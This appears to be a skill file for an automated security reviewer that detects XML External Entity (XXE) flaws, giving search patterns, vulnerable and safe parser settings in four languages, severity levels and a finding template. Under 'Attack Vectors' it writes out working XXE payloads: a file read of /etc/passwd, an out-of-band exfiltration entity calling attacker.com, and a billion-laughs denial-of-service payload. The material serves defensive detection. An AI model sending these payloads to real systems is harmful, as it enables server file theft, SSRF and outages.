---
name: sc-xxe
description: XML External Entity injection detection across all XML parsers and document formats
---

# SC: XML External Entity (XXE)

## Purpose

Detects XXE vulnerabilities where XML parsers process external entity declarations, enabling file disclosure, SSRF, denial-of-service (billion laughs), and in some cases remote code execution. Covers standard XML parsers, SOAP services, SVG processing, XLSX/DOCX parsing, and RSS/Atom feed processing.

## Activation

Called by sc-orchestrator during Phase 2 when XML processing is detected.

## Phase 1: Discovery

### File Patterns to Search
```
**/*.java, **/*.cs, **/*.py, **/*.php, **/*.go, **/*.ts, **/*.js,
**/*.rb, **/*xml*, **/*soap*, **/*parse*, **/*feed*, **/*svg*,
**/*xlsx*, **/*docx*, **/*rss*, **/web.xml
```

### Keyword Patterns to Search
```
# Java
"SAXParserFactory", "DocumentBuilderFactory", "XMLInputFactory",
"TransformerFactory", "XMLReader", "SAXReader", "Unmarshaller",
"SchemaFactory", "XPathExpression"

# C#/.NET
"XmlDocument", "XmlReader", "XmlTextReader", "XPathDocument",
"XDocument", "XmlSerializer", "XslCompiledTransform"

# Python
"lxml.etree", "xml.etree.ElementTree", "xml.dom.minidom",
"xml.sax", "defusedxml", "xmltodict"

# PHP
"simplexml_load_string", "simplexml_load_file", "DOMDocument",
"XMLReader", "SimpleXMLElement", "libxml_disable_entity_loader"

# Go
"encoding/xml", "xml.NewDecoder", "xml.Unmarshal"

# Node.js
"xml2js", "fast-xml-parser", "xmldom", "sax", "libxmljs"
```

### Attack Vectors

**1. Classic XXE — File Disclosure:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**2. Blind XXE — Out-of-Band Data Exfiltration:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

**3. Billion Laughs (DoS):**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
```

## Phase 2: Verification

### Secure Parser Configuration by Language

**Java (most common XXE target):**
```java
// VULNERABLE: Default configuration allows XXE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(inputStream); // XXE possible!

// SAFE: Disable external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

**C#/.NET:**
```csharp
// VULNERABLE: XmlDocument with DTD processing
XmlDocument doc = new XmlDocument();
doc.XmlResolver = new XmlUrlResolver(); // Resolves external entities!
doc.LoadXml(userInput);

// SAFE: Disable DTD processing
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;
doc.LoadXml(userInput);

// Or use XmlReaderSettings
var settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
```

**Python:**
```python
# VULNERABLE: lxml default allows external entities
from lxml import etree
doc = etree.fromstring(user_input)

# SAFE: Use defusedxml
import defusedxml.ElementTree as ET
doc = ET.fromstring(user_input)

# Or configure lxml parser
parser = etree.XMLParser(resolve_entities=False, no_network=True)
doc = etree.fromstring(user_input, parser=parser)
```

**PHP:**
```php
// VULNERABLE: Default SimpleXML
$xml = simplexml_load_string($userInput);

// SAFE: Disable entity loading (PHP < 8.0)
libxml_disable_entity_loader(true);
$xml = simplexml_load_string($userInput, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_NONET);

// PHP 8.0+ disables external entities by default
```

## Severity Classification

- **Critical:** XXE allowing file read of sensitive files (/etc/passwd, web.config) or SSRF to internal services
- **High:** Blind XXE with out-of-band data exfiltration capability
- **Medium:** XXE denial-of-service (billion laughs), or XXE with limited file read scope
- **Low:** XXE in admin-only functionality, or parser that has partial protections

## Output Format

### Finding: XXE-{NNN}
- **Title:** XML External Entity Injection in {parser/endpoint}
- **Severity:** Critical | High | Medium | Low
- **Confidence:** 0-100
- **File:** file/path:line
- **Vulnerability Type:** CWE-611 (Improper Restriction of XML External Entity Reference)
- **Description:** {Parser type} processes XML input without disabling external entity resolution.
- **Proof of Concept:** An attacker could submit XML with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` to read server files.
- **Impact:** Arbitrary file read, SSRF to internal network, denial of service, potential RCE.
- **Remediation:** Disable DTD processing and external entity resolution in the XML parser configuration.
- **References:** https://cwe.mitre.org/data/definitions/611.html, https://owasp.org/Top10/A05_2021-Security_Misconfiguration/

## Common False Positives

1. **defusedxml usage** — Python's defusedxml library prevents XXE by default
2. **PHP 8.0+** — external entity loading disabled by default
3. **Go encoding/xml** — does not process external entities by default
4. **JSON APIs** — XML parser present in code but endpoint only accepts JSON
5. **Static XML generation** — code generates XML output without parsing XML input
6. **XSLT with safe configuration** — XSLT processing with entity resolution disabled
